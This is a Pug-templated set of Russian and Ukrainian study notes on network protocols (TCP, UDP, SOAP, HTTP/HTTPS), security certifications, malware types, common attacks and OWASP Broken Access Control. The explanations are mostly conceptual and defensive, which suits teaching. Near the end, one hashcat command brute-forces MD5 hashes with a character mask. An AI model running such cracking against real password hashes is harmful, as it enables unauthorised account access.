            Процесс начала сеанса TCP (также называемый <dfn>«рукопожатие»</dfn> (англ. handshake)), состоит из трёх шагов. <br>
            <br>
            1. Клиент, который намеревается установить соединение, посылает серверу сегмент с номером последовательности и флагом SYN.<br>
            - Сервер получает сегмент, запоминает номер последовательности и пытается создать сокет (буфера и управляющие структуры памяти) для обслуживания нового клиента.<br>
            - В случае успеха сервер посылает клиенту сегмент с номером последовательности и флагами SYN и ACK, и переходит в состояние SYN-RECEIVED.<br>
            - В случае неудачи сервер посылает клиенту сегмент с флагом RST.<br>
            2. Если клиент получает сегмент с флагом SYN, то он запоминает номер последовательности и посылает сегмент с флагом ACK.<br>
            - Если клиент одновременно получает и флаг ACK (что обычно и происходит), то он переходит в состояние ESTABLISHED.<br>
            - Если клиент получает сегмент с флагом RST, то он прекращает попытки соединиться.<br>
            - Если клиент не получает ответа в течение 10 секунд, то он повторяет процесс соединения заново.<br>
            3. Если сервер в состоянии SYN-RECEIVED получает сегмент с флагом ACK, то он переходит в состояние ESTABLISHED.<br>
            - В противном случае после тайм-аута он закрывает сокет и переходит в состояние CLOSED.<br>
                                
        //- UDP
        details
          summary UDP
          p.
            <dfn>UDP</dfn> - User Datagram Protocol <br>
            В отличии от TCP, UDP - очень быстрый протокол поскольку в нём определён самый минимальный механизм необходимый для передачи данных. <br>
            Сообщения поступают в любом порядке и то, которое отправлено первым, может быть получено последним. <br>
            Доставка сообщений UDP вовсе не гарантируется, сообщение может потеряться и могут быть получены две копии одного и того же сообщения. <br>
            Такой случай возникает если для отправки сообщений в один адрес использовать два разных маршрута. <br>
            UDP не требует открывать соединение и данные могут быть отправлены сразу же как только они подготовлены. <br>
            UDP не отправляет подтверждающие сообщения, поэтому данные могут быть потеряны.
          img(src="./img/web/TCP__UDP.png" alt="")
          img(src="./img/web/TCP_UDP.png" alt="")
                                
        //- SOAP
        details
          summary SOAP
          p.
            <dfn>SOAP</dfn> — протокол обмена структурированными сообщениями в распределённой вычислительной среде. <br>
            Первоначально SOAP предназначался, в основном, для реализации удалённого вызова процедур (RPC). <br>
            Сейчас протокол используется для обмена произвольными сообщениями в формате XML, а не только для вызова процедур.<br>        
          img(src="./img/web/soap.png" alt="")
          br
          p.
            <dfn>SOAP-сообщение</dfn> представляет собой XML-документ; <br>
            сообщение состоит из трех основных элементов: <br>
            <br>
            <dfn>SOAP Envelope</dfn> - конверт. <br>
            Является самым «верхним» элементом SOAP сообщения. <br>
            Содержит корневой элемент XML-документа. <br>
            Описывается с помощью элемента Envelope с обязательным пространством имен: <br>
            http://www.w3.org/2003/05/soap-envelope для версии 1.2 <br>
            и http://schemas.xmlsoap.org/soap/ для версии 1.1. <br>
            <br>
            <dfn>SOAP Header</dfn> - заголовок. <br>
            Первый прямой дочерний элемент конверта. Необязательный. <br>
            Заголовок кроме атрибутов xmlns может содержать 0 или более стандартных атрибутов: <br>
            - encodingStyle <br>
            - actor (или role для версии 1.2) <br>
            - mustUnderstand <br>
            - relay <br>
            <br>
            <dfn>SOAP Body</dfn> - тело. <br>
            Элемент Body обязательно записывается сразу за элементом Header, если он есть в сообщении, или первым в SOAP-сообщении, если заголовок отсутствует. <br>
            В элемент Body можно вложить произвольные элементы, спецификация никак не определяет их структуру. <br>
            Определен только один стандартный элемент, который может быть в теле сообщения - Fault, содержащий сообщение об ошибке. <br>
            Если SOAP-сервер, обрабатывая поступившее SOAP-сообщение, обнаружит ошибку, то он прекратит обработку и отправит клиенту SOAP-сообщение, содержащее один элемент Fault с сообщением об ошибке.<br>
            <br>
            REST vs SOAP - Простота VS Стандарты<br>
          img(src="./img/web/rs1.png" alt="")
          img(src="./img/web/rs2.png" alt="")
          img(src="./img/web/rs3.png" alt="")
          img(src="./img/web/rs4.png" alt="")
          img(src="./img/web/rs5.png" alt="")
          img(src="./img/web/rs6.png" alt="")
          br
          p.
            <dfn>WSDL</dfn> - Web Services Definition Language <br>
            Язык описания веб-сервисов WSDL (Web Services Description Language) основан на языке XML<br>
            Каждый документ WSDL можно разбить на следующие логические части:<br>
            - <dfn>определение типов данных</dfn> (types) — определение вида отправляемых и получаемых сервисом XML сообщений<br>
            - <dfn>элементы данных</dfn> (message) — сообщения, используемые web-сервисом<br>
            - <dfn>абстрактные операции</dfn> (portType) — список операций, которые могут быть выполнены с сообщениями<br>
            - <dfn>связывание сервисов</dfn> (binding) — способ, которым сообщение будет доставлено<br>
          img(src="./img/web/WSDL.png" alt="")

        //- HTTP
        details
          summary HTTP
          p.
            <dfn>HyperText Transfer Protocol</dfn> — «протокол передачи гипертекста» — протокол прикладного уровня передачи данных. <br>
            Изначально — в виде гипертекстовых документов в формате HTML (документов, которые содержат ссылки, позволяющие переходить к другим документам). <br>
            В настоящий момент используется для передачи произвольных данных).<br>
          img(src="./img/web/request.png" alt="")
          p Основой HTTP является технология «клиент-сервер», то есть предполагается существование потребителей (клиентов), которые инициируют соединение и посылают запрос, и поставщиков (серверов), которые ожидают соединения для получения запроса, производят необходимые действия и возвращают обратно сообщение с результатом.<br>
          img( src="./img/web/ClientServer.png" alt="")
          p.
            Обычно с помощью протокола HTTP осуществляется обмен данными между вэб-браузером и вэб-сервером.<br>
            Благодаря протоколу HTTP обеспечивается работа всемирной паутины.<br>
            Также HTTP часто используется как протокол передачи информации для других протоколов прикладного уровня, таких как: SOAP, XML-RPC, WebDAV.<br>
            В таком случае говорят, что протокол HTTP используется как транспорт.<br>
            API многих программных продуктовиспользую HTTP для передачи данных - сами данные при этом могут иметь любой формат: XML или JSON.<br>
            Как правило передача данных по протоколу HTTP осуществляется через TCP/IP-соединения.<br>
            Серверное ПО при этом обычно использует TCP-порт 80, хотя может использовать и любой другой.<br>

          //- HTTP-structure
          details
            summary HTTP-structure
            p Каждое HTTP-сообщение состоит из трёх частей:

            //- Starting line
            details
              summary Starting line
              p.
                <dfn>Стартовая строка</dfn> (англ. Starting line) — определяет тип сообщения. <br>
                Method - URI - Version <br>
                - <dfn>Method</dfn> - метод запроса. <br>
                - <dfn>URI</dfn> - путь к запрашиваемому документу. <br>
                - <dfn>Version</dfn> - версия протокола, пара разделенных точкой цифр. Например: 1.0
              img(src="./img/web/req.png" alt="")
              p.
                <dfn>Стартовая строка ответа</dfn> <br>
                Version - Status Code - Reason Phrase <br>
                <dfn>Version</dfn> - версия протокола, пара разделенных точкой цифр. Например: 1.0<br>
                <dfn>Код состояния</dfn> (англ. Status Code) — три цифры. <br>
                Відповіді HTTP: <br>
                - Informational responses (100 – 199) <br>
                - Successful responses (200 – 299) <br>
                - Redirection messages (300 – 399) <br>
                - Client error responses (400 – 499) <br>
                - Server error responses (500 – 599) <br>
                По коду состояния определяется дальнейшее содержимое сообщения и поведение клиента. <br>
                <dfn>Пояснение</dfn> (англ. Reason Phrase) — текстовое короткое пояснение к коду ответа для пользователя. <br>
                Никак не влияет на сообщение и является необязательным. <br>
              img(src="./img/web/res.png" alt="")
              
            //- HTTP-mathods
            details
              summary HTTP-mathods
              p.
                <dfn>Тип HTTP-запроса</dfn> (также называемый HTTP-метод) указывает серверу на то, какое действие мы хотим произвести с ресурсом. <br>
                Изначально (в начале 90-х) предполагалось, что клиент может хотеть от ресурса только одно — получить его, однако сейчас по протоколу HTTP можно создавать посты, редактировать профиль, удалять сообщения и многое другое. <br>
                И эти действия сложно объединить термином «получение».<br>
                <br>
                <dfn>OPTIONS</dfn> - Используется для определения возможностей веб-сервера или параметров соединения для конкретного ресурса.<br>
                <br>
                <dfn>GET</dfn> - Используется для запроса содержимого указанного ресурса. <br>
                С помощью метода GET можно также начать какой-либо процесс.<br>
                <br>
                <dfn>HEAD</dfn> - Аналогичен методу GET, за исключением того, что в ответе сервера отсутствует тело. <br>
                Запрос HEAD обычно применяется для извлечения метаданных, проверки наличия ресурса (валидация URL) и чтобы узнать, не изменился ли он с момента последнего обращения.<br>
                <br>
                <dfn>POST</dfn> - Применяется для передачи пользовательских данных заданному ресурсу. <br>
                Например, в блогах посетители обычно могут вводить свои комментарии к записям в HTML-форму, после чего они передаются серверу методом POST и он помещает их на страницу. <br>
                При этом передаваемые данные (в примере с блогами — текст комментария) включаются в тело запроса.<br>
                <br>
                <dfn>PUT</dfn> - Применяется для загрузки содержимого запроса на указанный в запросе URI. <br>
                Если по заданному URI не существует ресурс, то сервер создаёт его и возвращает статус 201 (Created). <br>
                Если же был изменён ресурс, то сервер возвращает 200 (Ok) или 204 (No Content).<br>
                <br>
                <dfn>PATCH</dfn> - Аналогично PUT, но применяется только к фрагменту ресурса.<br>
                <br>
                <dfn>DELETE</dfn> - Удаляет указанный ресурс.<br>
                <br>
                <dfn>TRACE</dfn>  - Возвращает полученный запрос так, что клиент может увидеть, какую информацию промежуточные серверы добавляют или изменяют в запросе.<br>
                <br>
                <br><dfn>CONNECT</dfn> - Преобразует соединение запроса в прозрачный TCP/IP-туннель, обычно чтобы содействовать установлению защищённого SSL-соединения через нешифрованный прокси.<br>
                <br>
              img(src="./img/web/get.png" alt="")
              img(src="./img/web/post.png" alt="")
              
            //- HTTP-status
            details
              summary HTTP-status
              p.
                Код состояния является частью первой строки ответа сервера. <br>
                Он представляет собой целое число из трёх цифр. <br>
                Первая цифра указывает на класс состояния. <br>
                За кодом ответа обычно следует отделённая пробелом поясняющая фраза на английском языке, которая разъясняет человеку причину именно такого ответа<br>
                <br>
                1xx - <dfn>Информационный</dfn> (англ. informational) - Информирование о процессе передачи. <br>
                В HTTP/1.0 — сообщения с такими кодами должны игнорироваться. <br>
                В HTTP/1.1 — клиент должен быть готов принять этот класс сообщений как обычный ответ, но ничего отправлять серверу не нужно. <br>
                Сами сообщения от сервера содержат только стартовую строку ответа и, если требуется, несколько специфичных для ответа полей заголовка. <br>
                Прокси-серверы подобные сообщения должны отправлять дальше от сервера к клиенту<br>
                <br>
                2xx - <dfn>Успех</dfn> (англ. Success) - Информирование о случаях успешного принятия и обработки запроса клиента. <br>
                В зависимости от статуса, сервер может ещё передать заголовки и тело сообщения.<br>
                <br>
                3xx - <dfn>Перенаправление</dfn> (англ. Redirection) - Сообщает клиенту, что для успешного выполнения операции необходимо сделать другой запрос (как правило по другому URI). <br>
                Из данного класса пять кодов <b>301, 302, 303, 305 и 307</b> относятся непосредственно к перенаправлениям (редирект). <br>
                Адрес, по которому клиенту следует произвести запрос, сервер указывает в заголовке Location. <br>
                При этом допускается использование фрагментов в целевом URI.<br>
                <br>
                4xx - <dfn>Ошибка клиента</dfn> (англ. Client Error) - Указание ошибок со стороны клиента. <br>
                При использовании всех методов, кроме HEAD, сервер должен вернуть в теле сообщения гипертекстовое пояснение для пользователя.<br>
                <br>
                5xx - <dfn>Ошибка сервера</dfn> (англ. Server Error) - Информирование о случаях неудачного выполнения операции по вине сервера. <br>
                Для всех ситуаций, кроме использования метода HEAD, сервер должен включать в тело сообщения объяснение, которое клиент отобразит пользователю.<br>
            
            //- HTTP Headers
            details
              summary HTTP Headers
              p.
                <dfn>Заголовки HTTP</dfn> (англ. HTTP Headers) — это строки в HTTP-сообщении, содержащие разделённую двоеточием пару параметр-значение. <br>
                Формат заголовков соответствует общему формату заголовков текстовых сетевых сообщений ARPA (см. RFC 822). <br>
                Заголовки должны отделяться от тела сообщения хотя бы одной пустой строкой<br>
              img(src="./img/web/Header.png" alt="")
              img(src="./img/web/Headers.png" alt="")
                
            //- Message body
            details
              summary Message body
              p <dfn>Тело HTTP-сообщения</dfn> (message-body), если оно присутствует, используется для передачи тела объекта, связанного с запросом или ответом.<br>
              img(src="./img/web/Cookie.png" alt="")
          
        //- HTTPS
        details
          summary HTTPS
          p.
            <dfn>HTTPS</dfn> (Hypertext Transfer Protocol Secure) — защищённая версия HTTP. <br>
            Использует SSL-протокол, который активируется после установки SSL-сертификата и зашифровывает личную информацию, перед тем как передать её владельцу сайта<br>
          img(src="./img/web/connect.png" alt="")
          p.
            Ключи шифрования HTTPS. <br>
            В основе любого метода шифрования лежит ключ. <br>
            <dfn>Ключ</dfn> — это способ зашифровать или расшифровать сообщение. <br>
            В работе SSL-сертификата участвуют три ключа: публичный, приватный и сеансовый<br>
          img(src="./img/web/key.png" alt="")

    //- Certifications
    details
      summary Certifications
      p.
        CCST - Это сертификация начального уровня для новичков, 
        готовящихся начать свою карьеру в сфере кибербезопасности. 
        Она ориентирована на учащихся старших классов и студентов, 
        а также тех, кто заинтересован в смене профессии. 
        Этот сертификат не имеет срока действия и не требует периодической переаттестации.

        CompTiA Security+ - Это сертификат безопасности начального уровня,
        отвечающий требованиям Директивы Министерства обороны США 8570.01-M,
        являющийся важным пунктом для тех, кто хочет работать
        в области ИТ-безопасности для федерального правительства.

        EC Council Certified Ethical Hacker (CEH) - Эта сертификация проверяет 
        ваше понимание и знание того, как искать слабые места и уязвимости 
        в целевых системах, используя те же знания и инструменты, 
        что и злонамеренный хакер, но законным и легитимным способом.

        CISSP ISC2 - Это наиболее узнаваемый и популярный сертификат безопасности. 
        Чтобы сдать экзамен, необходимо иметь по крайней мере пять лет опыта 
        работы в соответствующей отрасли.

        Cisco CyberOps - Эта сертификация подтверждает навыки, 
        необходимые для аналитиков по кибербезопасности в операционных центрах безопасности.

        <em>Активності:</em><br>
        - Тестування на проникнення/Аудит/Консультація<br>
        - Полювання на вразливості (Bug Bounty)<br>
        - Capture the flag<br>
        - Аудит на дотримання вимог<br>
        - Розробка та впровадження політик безпеки<br>
        - Керування ризиками<br>
        - Оперативний центр безпеки (SOC)<br>
        - DevSecOps<br>
      a(href="https://campaigns.eccouncil.org/become-a-certified-ethical-hacker-intl") Сертифікація CEH<br>
      a(href="https://elearnsecurity.com/") Сертифікація INE Security<br>
      a(href="https://www.offsec.com/") Сертифікація Offensive security<br>
      a(href="https://www.sans.org/") SANS, Cyber Security Training, Certifications, Degrees and Resources<br>
      a(href="https://www.amazon.jobs/de/teams/aws-security-engineer") AWS Security Engineer<br>
      a(href="https://www.isc2.org/") Сертифікації (ISC)2<br>
      img(src="./img/web/Cert.png" alt="")

    //- Вредоносное ПО
    details
      summary Вредоносное ПО
      p.
        Вредоносное программное обеспечение – это любой код, который может использоваться для похищения данных, обхода системы управления доступом, повреждения или компрометации системы.
        
        Вирус – это тип компьютерной программы, которая при выполнении реплицируется и присоединяется к другим файлам, например легитимной программе, вставляя в нее собственный код. Одни вирусы не наносят вреда, другие могут быть разрушителями, например, изменяющими или удаляющими данные. Большинство вирусов для активации нуждаются в взаимодействии с конечным пользователем, также они могут быть написаны для срабатывания в определенную дату или время.
        Вирусы могут распространяться либо через съемные носители, такие как USB-накопители, либо через загрузку в Интернете, либо через вложения электронной почты. Открытие файла или выполнение программы может активировать работу вируса. После активации вирус обычно инфицирует другие программы на компьютере или других компьютерах сети. Для предупреждения обнаружения вирусы довольно часто мутируют.
        Например, созданный в 1999 году вирус Melissa распространялся по электронной почте, инфицировав десятки тысяч пользователей и нанеся ущерб примерно на 1,2 миллиарда долларов.
        
        Червь – это злонамеренная программа, которая самостоятельно себя клонирует и распространяет, используя уязвимости в сетях. В отличие от вирусов, нуждающихся в запуске программ на узлах, черви могут запускаться самостоятельно. Помимо начального инфицирования узла они не требуют участия пользователя и могут очень быстро распространяться по сети, обычно замедляя ее работу.
        Черви построены по схожим шаблонам: они используют уязвимости систем, имеют способ самораспространения и содержат вредоносный код, так называемую полезную нагрузку (Payload) для повреждения компьютерных систем или сетей.
        Черви вызвали некоторые из самых разрушительных атак в Интернете. В 2001 году червь Code Red лишь за 19 часов инфицировал более 300 тысяч серверов.
        
        Троянский конь (Trojan Horse) – это вредоносное программное обеспечение, выполняющее вредоносные операции, маскируя свое настоящее намерение. Оно может показаться легальным, но на самом деле чрезвычайно опасно. Программы-трояне эксплуатируют привилегии тех пользователей, которые их запускают во исполнение.
        В отличие от вирусов, троянские лошади не саморазмножаются, а привязываются к неисполняемым файлам, в частности, файлам изображений, аудио или видео, действуя как приманка, с целью нанесения ущерба системам пользователей, не имеющим никаких подозрений по этому поводу.
        
        Логическая бомба (Logic Bomb) – это вредоносная программа, ожидающая активации (например, наступление определенной даты или появления определенной записи в базе данных) для запуска вредоносного кода. Логическая бомба остается неактивной до срабатывания события-триггера.
        
        Программа-вымогатель (Ransomware) – это программа, предназначенная для блокировки компьютерной системы или размещенных в ней данных до момента совершения выкупа.
        
        Серое или условно вредоносное программное обеспечение (Grayware) – это любая программа или приложение, поведение которого является раздражительным или нежелательным.

    //- Aтаки
    details
      summary Aтаки
      p.
        <dfn>Атаки отказа в обслуживании</dfn> (DoS) – это тип сетевой атаки, которую относительно легко может совершить даже неквалифицированный злоумышленник.<br>
        <br>
        <dfn>Распределенная атака DoS</dfn> (DDoS) подобна атаке DoS, но она происходит от нескольких скоординированных источников.<br>
        <dfn>Бот</dfn>-компьютер обычно заражается в результате посещения веб-сайта, открывания вложения электронной почты или через зараженный медиа-файл.<br>
        <br>
        <dfn>Ботнет</dfn> – это группа ботов, соединенных через Интернет, которые могут контролироваться одним злоумышленником или группой.<br>
        <br>
        Например:<br>
        - Злоумышленник строит сеть (ботнет) из зараженных узлов, которые называются зомби, контролируемыми системами управления.<br>
        - Компьютеры-зомби будут постоянно сканировать и заражать все больше узлов, создавая все больше и больше зомби.<br>
        - Когда ботнет будет готов, хакер даст инструкцию системам управления, чтобы заставить ботнет зомби осуществить DDoS-атаку.<br>
        <br>
        Распределенные атаки отказа в обслуживании (DDoS, Distributed Denial of Service) подобны атакам отказа в обслуживании, но происходят из нескольких скоординированных источников.
        Злоумышленник строит сеть (Botnet) из инфицированных узлов, так называемых «зомби» (Zombies), контролируемых системами управления.
        Компьютеры-зомби постоянно сканируют сети и инфицируют все больше узлов, создавая все больше и больше зомби.
        Когда ботнет будет готов к использованию, хакер посылает команду системам управления ботнета осуществить DDoS-атаку.

        Атаки истощения ресурсов (Resource Exhaustion Attacks) – это атаки, которые вызывают аварийное завершение работы, зависание или иначе мешают функционировать программе-жертве или системе-жертве. В отличие от перегрузки пропускной способности сети, вызывающей DoS-атака, атаки истощения ресурсов вызывают перегрузку имеющихся аппаратных ресурсов сервера-жертвы.

        <em>Атаки на пароли</em>:<br>
        - <dfn>Распыление пароля</dfn><br>
        Эта техника пытается получить доступ к системе путем «распыления» нескольких часто используемых паролей на множество учетных записей.<br>
        К примеру, киберпреступник использует "Password123" со многими именами пользователей, прежде чем попробовать еще раз со вторым часто используемым паролем, таким как "qwerty".<br>
        Эта техника позволяет злоумышленнику оставаться незамеченным, поскольку он избегает частой блокировки аккаунта.<br>
        <br>
        - <dfn>Атака по словарю</dfn><br>
        Хакер систематически пробует каждое слово в словаре или списке часто употребляемых слов как пароль, пытаясь взломать защищенную паролем учетную запись.<br>
        <br>
        - <dfn>Атака грубой силы</dfn><br>
        Самый простой и часто используемый способ получения доступа к защищенному паролем сайту — атаки грубой силы,<br>
        заключающиеся в том, что злоумышленник использует все возможные комбинации букв, цифр и символов в пространстве для паролей, пока он не справится.<br>
        <br>
        - <dfn>Атака радугой</dfn><br>
        Пароли в компьютерной системе хранятся не как обычный текст, а как хешированные значения (числовые значения, однозначно идентифицирующие данные).<br>
        <dfn>Радужная таблица</dfn> – это большой словарь предварительно вычисленных хешей и паролей, из которых они были вычислены.<br>
        В отличие от атаки грубой силы, которая должна вычислять каждый хэш, радужная атака сравнивает хэш пароля с хранящимся в таблице радуги.<br>
        Когда злоумышленник находит соответствие, он идентифицирует пароль, используемый для создания хеша.<br>
        <br>
        - <dfn>Перехват трафика</dfn><br>
        Простой текст или незашифрованные пароли могут быть легко прочитаны другими людьми и машинами, перехватывая соединение.<br>
        Если вы сохраняете пароль в виде четкого, читабельного текста, любой, кто имеет доступ к вашему аккаунту или устройству, будь то авторизованный или неавторизованный, сможет прочитать его.<br>
        <br>
        Атака на API
        Атака, при которой передача корректных данных злонамеренно или мошеннически повторяется или задерживается злоумышленником, который перехватывает, изменяет и повторно посылает данные, чтобы заставить получателя выполнить действия, необходимые злоумышленнику.

        Упрощенный протокол доступа к каталогам (LDAP, Lightweight Directory Access Protocol) – это открытый протокол, на основе которого осуществляется аутентификация пользователей при доступе к службам каталогов.
        Атака LDAP-инъекция использует уязвимости проверки ввода данных, за счет внедрения и выполнения запросов к LDAP-серверам, предоставляя киберпреступникам возможность получать конфиденциальную информацию из LDAP-каталога организации.
        Для получения определенной информации (названий внутренних систем, названий имеющихся на веб-сервере каталогов или файлов, названий баз данных, таблиц и полей, которые можно использовать для реализации SQL-атак и т.п.), злоумышленники могут использовать сообщения об ошибках.
        Обход каталога происходит в случае, если злоумышленник может прочитать файлы веб-сервера, размещенные вне каталога веб-сайта. Затем злоумышленник может использовать эту информацию для загрузки файлов конфиденциальных настроек сервера, потенциально обнаружить больше уязвимостей сервера или даже получить контроль над ним!

        <dfn>Усовершенствованные устойчивые угрозы</dfn> (advanced persistent threats, АРТ) – многофазные, долговременные, незаметные и сложные действия, направленные на конкретную жертву.<br>
        По этой причине отдельному злоумышленнику часто не хватает навыков, ресурсов или настойчивости для выполнения APT.<br>
        <br>
        Исследователи безопасности Google обнаружили <b>Meltdown</b> и <b>Spectre</b>, две аппаратные уязвимости, влияющие на многие центральные процессоры (ЦП), выпущенные с 1995 года в настольных компьютерах, ноутбуках, серверах, смартфонах, умных устройствах и облачных сервисах.<br>
        Злоумышленники, эксплуатирующие эти уязвимости, могут прочитать всю память из данной системы (Meltdown), а также данные, обрабатываемые другими программами (Spectre).<br>
        <br>
        - <dfn>Переполнение буфера</dfn>
        <em>Буферы</em> – это области памяти, выделенные приложению.<br>
        Эта уязвимость возникает, когда данные записываются вне буфера.<br>
        Изменяя данные за пределами буфера, приложение получает доступ к памяти, выделенной для других процессов. Это может повлечь за собой крах системы, компрометацию данных или получение полномочий более высокого уровня.<br>
        <br>
        Буферы – области оперативной памяти, которые выделяются для работы каждому приложению. Переполнение буфера (Buffer Overflow) возникает, если объем данных превышает размер выделенного буфера. Изменяя данные за пределами буфера, приложение получает доступ к оперативной памяти, выделенной для других процессов. Такая ситуация может повлечь за собой выход системы из строя, компрометацию данных или получение полномочий более высокого уровня.
        
        - <dfn>Непроверенные входящие данные</dfn>
        Входящие данные могут содержать вредоносное содержимое, предназначенное для того, чтобы заставить программу вести себя непредсказуемо.<br>
        <br>
        - <dfn>Гонка</dfn>
        Эта уязвимость описывает ситуацию, когда результат события зависит от того, в какой последовательности или с какой продолжительностью выполняются инструкции.<br>
        Состояние гонки становится источником уязвимости, когда события, требующие упорядочения или временной синхронизации, не происходят в правильном порядке или не укладываются в положенные временные рамки.<br>
        <br>
        Атака гонки (Race Сondition Attack), также известная как атака на время проверки (TOC, Time Of Check ) или атака по времени использования (TOU, Time Of Use) - это атака, которая заставляет компьютерную систему, предназначенную для выполнения задач в определенной последовательности одновременно выполнять две или более операции.
        Например, работа операционной системы – это работа совокупности потоков — наименьших последовательностей программных инструкций, необходимых для выполнения процесса. Случай, когда два или более потока получают доступ к общим данным и пытаются изменить их одновременно, это случай реализации атаки гонки.

        - <dfn>Недостатки системы безопасности</dfn>
        Системы и конфиденциальные данные можно защитить с помощью таких методов, как аутентификация, авторизация и шифрование.<br>
        Разработчики должны использовать методы безопасности и библиотеки, уже созданные, протестированные и проверенные, и не должны пытаться создавать собственные алгоритмы безопасности. Вероятно, это может внести новые уязвимости.<br>
        <br>
        - <dfn>Контроль доступа</dfn>
        Процесс контроля того, кто что делает, и варьируется от управления физическим доступом к оборудованию до определения того, кто имеет доступ к ресурсу, например файлу, и что они могут с ним делать, например, читать или изменять файл.<br>
        Многие уязвимости безопасности появляются из-за неправильного использования средств контроля доступа.<br>
        Почти все средства контроля доступа и меры предосторожности можно обойти, если злоумышленник имеет физический доступ к целевому оборудованию.<br>
        К примеру, независимо от настроек разрешения на файл, хакер может обойти операционную систему и прочитать данные непосредственно с диска.<br>
        Для защиты устройств и размещенных на них данных необходимо использовать ограничения физического доступа.<br>
        Для защиты данных от кражи или повреждения следует использовать методы шифрования.<br>
        <br>

        TCP SYN Flood - отсыл большого количества запросов на соединение
        TCP reset - отправка пакета с сегиентом TCP RST вызовет прерывание соединения
        TCP session hijacking - подделывает IP-адрес одного из узлов,
        предусматривает следующий порядковый номер IP-адреса и отправляет ACK на другой узел

        UDP flood - UDP Unicorn или Low Orbit Ion Cannon - проверят все порты
        и от каждого закрытого порта сервер отправит ICMP про недестопность
        получается лавина ICMP от всех серверов сети.

      //- Broken Access Control
      details
        summary Broken Access Control
        p.
          <dfn>Broken Access Control</dfn> (Нарушение контроля доступа). <br>
          Контроль доступа обеспечивает соблюдение политики, согласно которой пользователи не могут действовать за пределами своих разрешений. 
          Сбои обычно приводят к несанкционированному раскрытию информации, изменению или уничтожению всех данных или выполнению бизнес-функции 
          за пределами возможностей пользователя.
          <ul>К распространенным уязвимостям контроля доступа относятся:
            <li>Нарушение принципа минимальных привилегий или запрета по умолчанию, 
                согласно которому доступ должен предоставляться только для определенных возможностей, 
                ролей или пользователей, но доступен всем.</li>
            <li>Обход проверок контроля доступа путем изменения URL-адреса (подделка параметров или принудительный просмотр), 
                внутреннего состояния приложения или страницы HTML либо с помощью инструмента атаки, изменяющего запросы API.</li>
            <li>Разрешение просмотра или редактирования чужой учетной записи путем предоставления ее уникального идентификатора 
                (небезопасные прямые ссылки на объекты)</li>
            <li>Доступ к API с отсутствующими элементами управления доступом для POST, PUT и DELETE.</li>
            <li>Повышение привилегий. Действовать как пользователь без входа в систему или действовать как администратор при входе в систему как пользователь.</li>
            <li>Манипулирование метаданными, например воспроизведение или подделка токена управления доступом JSON Web Token (JWT), 
                файлов cookie или скрытых полей, манипулируемых для повышения привилегий или злоупотребления аннулированием JWT.</li>
            <li>Неправильная конфигурация CORS обеспечивает доступ к API из неавторизованных/ненадежных источников.</li>
            <li>Принудительно просматривать аутентифицированные страницы в качестве неаутентифицированного пользователя 
                или привилегированные страницы в качестве обычного пользователя.</li>
          </ul>
          Контроль доступа эффективен только в доверенном серверном коде или бессерверном API, где злоумышленник не может изменить проверку контроля доступа или метаданные.
          <ul>
            <li>За исключением общедоступных ресурсов, по умолчанию запрещено.</li>
            <li>Реализуйте механизмы контроля доступа один раз и повторно используйте их во всем приложении, 
                включая минимизацию использования совместного использования ресурсов между источниками (CORS).</li>
            <li>Средства управления доступом к модели должны обеспечивать право собственности на записи, а не признавать, 
                что пользователь может создавать, читать, обновлять или удалять любую запись.</li>
            <li>Требования к бизнес-лимитам уникальных приложений должны обеспечиваться моделями предметной области.</li>
            <li>Отключите список каталогов веб-сервера и убедитесь, что метаданные файлов (например, .git) 
                и файлы резервных копий не присутствуют в корнях веб-сайта.</li>
            <li>Регистрируйте сбои контроля доступа и при необходимости предупреждайте администраторов (например, о повторяющихся сбоях).</li>
            <li>Ограничьте скорость доступа к API и контроллеру, чтобы минимизировать ущерб от инструментов автоматизированных атак.</li>
            <li>Идентификаторы сеансов с отслеживанием состояния должны быть признаны недействительными на сервере после выхода из системы. 
                Токены JWT без сохранения состояния должны быть недолговечными, чтобы окно возможностей для злоумышленника было сведено к минимуму. 
                Для долгоживущих JWT настоятельно рекомендуется следовать стандартам OAuth для отзыва доступа.</li>
          </ul>
          Разработчики и сотрудники отдела контроля качества должны включить функциональный модуль контроля доступа и интеграционные тесты. <br>
          a(href="https://cwe.mitre.org/data/index.html">CWE: 22, 23, 35, 59, 200, 201, 219, 264, 275, 276, 284, 285, 352, 359, 377, 402, 425. 441, 497, 538, 540, 548,
          552, 566, 601, 639, 651, 668, 706, 862, 863, 913, 922, 1275.              
        img(src="./img/web/Access.png" alt="")
        img(src="./img/web/Access_.png" alt="")
        img(src="./img/web/Access__.png" alt="")
        img(src="./img/web/Session.png" alt="")
        img(src="./img/web/Session_.png" alt="")
        br
        p.
          Burp Suite — це інтегрована платформа та графічний інструмент для тестування безпеки веб-додатків, 
          він підтримує весь процес тестування, від початкового відображення та аналізу поверхні атаки програми до пошуку 
          та використання вразливостей безпеки.
        
          Туторіали по користуванню інструментом
          https://www.youtube.com/watch?v=nECt-0zW0O4
          https://www.youtube.com/watch?v=G3hpAeoZ4ek
        
          Cookie — це невеликий фрагмент даних, який сервер надсилає веб-браузеру користувача. Браузер може зберігати файли cookie 
          та надсилати їх назад на той самий сервер із наступними запитами. Як правило, файли cookie HTTP використовуються, щоб визначити, 
          чи надходять два запити з одного браузера, наприклад, щоб користувач залишався в системі. 
          Він запам’ятовує інформацію про стан для HTTP-протоколу без збереження стану.
        
          Детальніше про cookie
          https://www.cloudflare.com/learning/privacy/what-are-cookies/
          https://en.wikipedia.org/wiki/HTTP_cookie

          Методи автентифікації
          * HTML forms
          * Multi-factor Authentication
          * Client SSL certificates
          * HTTP Basic and Digest Authentication
          * NTLM or Kerberous
          * Login Services (Oauth)
        
          Рекомендації по встановленню пароля
          * Default credentials
          * Blank password
          * Predictable username/password
          * Password rules
          * The same as username
          * Default values
        
          hashcat -m 0 hash1.txt -O -a 3 -1 \?d\?l\?u \?1\?1\?1\?1\?1\?1\?1\?1
        
          Захист від брутфорсу
          * Lockout
          * Lockout with valid password
          * Cookie
          * Captcha
          * Username bruteforce
          * LockOut attack
        
          Функціонал зміни/відновлення паролю
          * Ask current password
          * Bruteforce
          * Easy question
          * Password hints
          * Third party applications:
          * Password in clear text
          * Directly session access
          * Do not check an email
          * Guessable ID
          * User notifications
        
          Вразливості
          * Remember me functionality
          * Same usernames
          * Activation Link
          * Generated password
          * Password distribution
          * Multistage Login
          * Deleted/locked account
          * Insecure credential storage
        
          Захист
          * Use strong credentials
          * Correct credential validation
          * Prevent credential disclosure
          * Prevent bruteforce attack
          * Change password and account recovery functionality is secure
          * Log monitor notify
        
          Broken access control 
          Це тип вразливості, який дозволяє неавторизованому користувачу доступ до обмежених ресурсів. 
